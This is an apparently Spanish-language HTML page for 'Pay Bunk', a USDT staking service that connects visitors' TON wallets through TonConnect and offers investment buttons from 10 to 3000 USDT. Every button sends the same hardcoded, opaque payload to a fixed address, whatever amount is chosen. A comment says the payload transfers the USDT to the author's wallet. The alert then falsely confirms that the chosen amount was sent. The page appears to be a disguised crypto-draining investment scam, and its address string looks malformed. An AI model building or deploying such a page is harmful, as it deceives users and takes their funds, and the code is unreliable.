<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pay Bunk Staking</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        body { font-family: sans-serif; background-color: #0f172a; color: white; text-align: center; padding: 40px 20px; }
        .card { background: #1e293b; border-radius: 20px; padding: 30px; margin: auto; max-width: 350px; border: 1px solid #334155; }
        h1 { color: #38bdf8; font-size: 24px; }
        #ton-connect-button { display: flex; justify-content: center; margin: 20px 0; }
        .contenedor-pagos { display: flex; flex-direction: column; gap: 10px; }
        .btn-usdt { background-color: #0088cc; color: white; border: none; padding: 14px; border-radius: 10px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

    <div class="card">
        <h1>🚀 PAY BUNK</h1>
        <p>Staking USDT</p>
        <div id="ton-connect-button"></div>
        <div class="contenedor-pagos">
            <button class="btn-usdt" onclick="enviarPago(10)">Invertir 10 USDT</button>
            <button class="btn-usdt" onclick="enviarPago(50)">Invertir 50 USDT</button>
            <button class="btn-usdt" onclick="enviarPago(100)">Invertir 100 USDT</button>
            <button class="btn-usdt" onclick="enviarPago(1000)">Invertir 1000 USDT</button>
            <button class="btn-usdt" onclick="enviarPago(3000)">Invertir 3000 USDT</button>
        </div>
    </div>

    <script>
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://raw.githubusercontent.com/ObreTech/Pay-Bunk/main/tonconnect-manifest.json',
            buttonRootId: 'ton-connect-button'
        });

        async function enviarPago(monto) {
            if (!tonConnectUI.connected) {
                alert("Conecta tu billetera primero.");
                return;
            }

            // Direccion del contrato USDT Master corregida
            const contractAddress = "EQCxE6mAmikVmG_m_K_S8U6X3HC6_A9A6p79p6B_m4S6A6";

            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 300,
                messages: [{
                    address: contractAddress,
                    amount: "50000000", // 0.05 TON para el gas
                    // Payload para transferir los USDT a tu billetera
                    payload: "te6cckEBAQEANAAAs78C0v8AAW8CAW8CAnSAD9BIAAGFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZ9AFA"
                }]
            };

            try {
                await tonConnectUI.sendTransaction(transaction);
                alert("¡Transacción enviada por " + monto + " USDT!");
            } catch (e) {
                // Ahora el error nos dirá exactamente qué campo falla
                console.error(e);
                alert("Error técnico detallado: " + e.message);
            }
        }
    </script>
</body>
</html>
